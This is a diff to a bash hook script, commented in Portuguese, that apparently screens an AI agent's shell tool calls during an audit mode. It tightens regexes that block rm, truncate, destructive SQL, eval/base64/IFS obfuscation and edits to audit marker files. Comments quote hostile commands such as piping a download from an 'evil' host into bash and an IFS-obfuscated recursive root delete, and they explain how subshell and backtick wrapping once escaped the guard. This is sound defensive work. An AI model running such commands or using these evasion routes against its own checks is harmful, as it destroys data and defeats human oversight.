@@ -94,17 +94,18 @@ PROTECTED_PATH_REGEX='(^|/)(\.gitignore|\.gitattributes|\.dockerignore|\.env([.-
 # sudo rm, e binário com path absoluto (/bin/rm, /usr/bin/rm, /usr/local/bin/rm).
 #
 # Fronteira de palavra obrigatória: o char imediatamente antes do token "rm"
-# (ou dos seus prefixos opcionais) tem de ser início-de-clause, espaço, "/" ou
-# "\" — NUNCA uma letra/dígito. Sem isto "rm" batia como substring dentro de
-# qualquer palavra terminada em "rm" (terraform, inform, platform, confirm),
-# bloqueando comandos totalmente benignos durante contexto de audit.
-RM_BINARY_REGEX='(^|[[:space:]]|/|\\)(sudo[[:space:]]+)?(\\)?(command[[:space:]]+)?((/usr)?(/local)?/(s)?bin/)?rm'
+# (ou dos seus prefixos opcionais) tem de ser início-de-clause, espaço, "/", "\",
+# "(" ou backtick — NUNCA uma letra/dígito. Sem "("/backtick, um "rm" embrulhado
+# em substituição de comando ($(rm ...)), subshell ((rm ...)) ou backticks
+# (`rm ...`) escapava ao guard. Sem os restantes delimitadores, "rm" batia como
+# substring de "terraform", "inform", "platform", "confirm", bloqueando benignos.
+RM_BINARY_REGEX='(^|[[:space:]]|/|\\|\(|`)(sudo[[:space:]]+)?(\\)?(command[[:space:]]+)?((/usr)?(/local)?/(s)?bin/)?rm'
 # RM_TARGET_REGEX aceita um target normal (qualquer coisa) OU um target raiz nu
 # ("/" seguido de espaço/fim-de-string) — o buraco original só cobria o primeiro.
 RM_TARGET_REGEX='(-[a-zA-Z]*[rRf][a-zA-Z]*[[:space:]]+)?((/[^[:space:]/]+)*[^/[:space:]]|/([[:space:]]|$))'
 # truncate também exige a mesma fronteira (evita bater dentro de "ftruncate" ou
 # palavras que terminem em "truncate").
-TRUNCATE_REGEX='(^|[[:space:]]|/|\\)(sudo[[:space:]]+)?truncate[[:space:]]+'
+TRUNCATE_REGEX='(^|[[:space:]]|/|\\|\(|`)(sudo[[:space:]]+)?truncate[[:space:]]+'
 BASH_DESTRUCTIVE_REGEX="${RM_BINARY_REGEX}[[:space:]]+${RM_TARGET_REGEX}|(sudo[[:space:]]+)?git[[:space:]]+rm|${TRUNCATE_REGEX}|find[[:space:]].+-delete|find[[:space:]].+-exec[[:space:]]+rm"
 SQL_DESTRUCTIVE_REGEX='(DROP|ALTER|TRUNCATE|DELETE)[[:space:]]+(TABLE|FROM|DATABASE|SCHEMA)'
 
@@ -114,7 +115,8 @@ SQL_DESTRUCTIVE_REGEX='(DROP|ALTER|TRUNCATE|DELETE)[[:space:]]+(TABLE|FROM|DATAB
 # literalmente (ex: "bash -c \"rm -rf /x\"", "base64 -d payload | bash",
 # "rm${IFS}-rf${IFS}/"). Tratados como suspeitos por si só durante audit sem
 # apply aprovado — não tentamos fazer parsing completo do shell.
-BASH_OBFUSCATION_REGEX='(^|[;&|[:space:]])eval([[:space:]]|$)|base64[[:space:]]+(-d|--decode)\b|\$\{?IFS\}?|(^|[;&|[:space:]])(/bin/|/usr/bin/)?(bash|sh)[[:space:]]+-c\b|\|[[:space:]]*(/bin/|/usr/bin/)?(bash|sh)([[:space:]]|$)'
+# shellcheck disable=SC2016  # backtick e ${IFS} são literais do regex, não expansão de shell
+BASH_OBFUSCATION_REGEX='(^|[;&|(`[:space:]])eval([[:space:]]|$)|base64[[:space:]]+(-d|--decode)\b|\$\{?IFS\}?|(^|[;&|(`[:space:]])(/bin/|/usr/bin/)?(bash|sh)[[:space:]]+-c\b|\|[[:space:]]*(/bin/|/usr/bin/)?(bash|sh)([[:space:]]|$)'
 
 # Marker de audit e ficheiros de modo não podem ser escritos/movidos/apagados
 # a partir de dentro do próprio contexto de audit sem apply — senão o tool call
@@ -125,7 +127,7 @@ BASH_OBFUSCATION_REGEX='(^|[;&|[:space:]])eval([[:space:]]|$)|base64[[:space:]]+
 # substring). ">"/">>" não precisam de fronteira — não são letras, não há
 # ambiguidade de substring dentro de outra palavra.
 MARKER_PATH_REGEX='(~|\$\{?HOME\}?)/\.prumo/(audit-active|mode|lab-mode)\b'
-MARKER_WRITE_REGEX="(^|[[:space:]]|/|\\\\)(rm|mv|unlink|truncate|cp|sed[[:space:]]+-i|tee)[^;&|]*${MARKER_PATH_REGEX}|>{1,2}[^;&|]*${MARKER_PATH_REGEX}"
+MARKER_WRITE_REGEX="(^|[[:space:]]|/|\\\\|\\(|\`)(rm|mv|unlink|truncate|cp|sed[[:space:]]+-i|tee)[^;&|]*${MARKER_PATH_REGEX}|>{1,2}[^;&|]*${MARKER_PATH_REGEX}"
 
 case "$TOOL" in
   Bash)
@@ -141,7 +143,16 @@ case "$TOOL" in
 
     BLOCK_REASON=""
     BLOCK_CLAUSE=""
-    while IFS= read -r CLAUSE; do
+
+    # Ofuscação é avaliada sobre o comando INTEIRO (antes do split por clauses):
+    # o split por '|' abaixo apaga o próprio '|' que a deteção "pipe directo para
+    # um interpretador" (ex: "curl http://evil | bash") precisa de ver. eval,
+    # base64 -d e ${IFS} também são apanhados aqui, independentemente de clause.
+    if printf '%s' "$CMD" | grep -qiE "$BASH_OBFUSCATION_REGEX"; then
+      BLOCK_REASON="obfuscation"; BLOCK_CLAUSE="$CMD"
+    fi
+
+    while [ -z "$BLOCK_REASON" ] && IFS= read -r CLAUSE; do
       TRIMMED=$(printf '%s' "$CLAUSE" | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//')
       [ -z "$TRIMMED" ] && continue
 
